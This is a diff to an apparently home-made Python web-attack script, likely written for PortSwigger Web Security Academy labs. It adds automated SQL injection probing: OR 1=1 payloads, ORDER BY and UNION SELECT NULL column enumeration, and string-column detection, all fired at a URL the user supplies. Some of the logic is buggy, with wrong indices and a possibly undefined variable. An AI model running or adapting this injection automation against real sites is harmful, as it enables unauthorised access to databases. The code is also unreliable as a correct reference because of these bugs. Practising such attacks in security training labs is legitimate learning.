@@ -223,15 +223,51 @@ def Broken_Authentication():
             two_FA_broken_logic(url)
         else:
             break
+def replaceNth(s, source, target, n) :
+    inds = [i for i in range(len(s)-len(source)+1) if s[i:i+len(source)]==source]
+    if len (inds)< n:
+        return
+    s = list(s)
+    s[inds[n-1]: inds [n-1]+len(source)] = target
+    return ''.join(s)
 def SQl_injection_retrieval_of_hidden_data(url):
-    OR = ["' OR 1=1 -- ",
-                  "' OR '1'='1 -- "
-                  ]
+    OR = ["' OR 1=1 -- ","' OR '1'='1 -- "]
+    ORDERby = ["' ORDER BY "]
     print("Trying Error Based Injection with OR Payloads")
     for i in range(0, len(OR)):
         r = requests.get(url + OR[i])
         if (r.status_code == 200):
             print("{} worked".format(url + OR[1]))
+    print("Trying number of columns with ORDER BY ...")
+    for i in range(1, 50):
+        query = ORDERby[0] + str(i) + " -- "
+        r = requests.get(url +query)
+        if r.status_code==200:
+            print("Column {}is present".format(i))
+        else:
+            print("Total Number of columns are {} ".format(i-1))
+            return i
+    print("Trying number of columns with NULL ...")
+    for i in range(1, 50):
+        query = "NULL," * i
+        query = query[0: -1]
+        r = requests.get(url + "'UNION SELECT " + query + "--")
+        if r.status_code == 500:
+            print("Column {} gave 500 internal error ". format (1))
+        elif r.status_code == 200:
+            print("Total Number of columns are {}".format(i))
+            n = i
+    print("Trying which column contain string type ...")
+    query = "NULL," * n
+    query = query[0: -1]
+    for i in range(1, n+1):
+        fullurl = replaceNth(query, "NULL", "'a'",i)
+        r = requests.get(url + "' UNION SELECT "+ fullurl + " -- ")
+        if r.status_code == 200:
+            print("Column {} is string type ".format(i))
+        else:
+            pass
+
 def SQL_injection():
     while True:
 
@@ -243,7 +279,7 @@ def SQL_injection():
         print("\n")
         option = int(input("Select an option: "))
         print("\n")
-        if option == 9:
+        if option ==9:
             break
         elif option == 1:
             url = input("Enter a URL: ")
@@ -268,3 +304,4 @@ def main():
             break
 if __name__ == "__main__":
     main()
+#https://0a0300ff041ad69c85a41ce500f8000c.web-security-academy.net/login
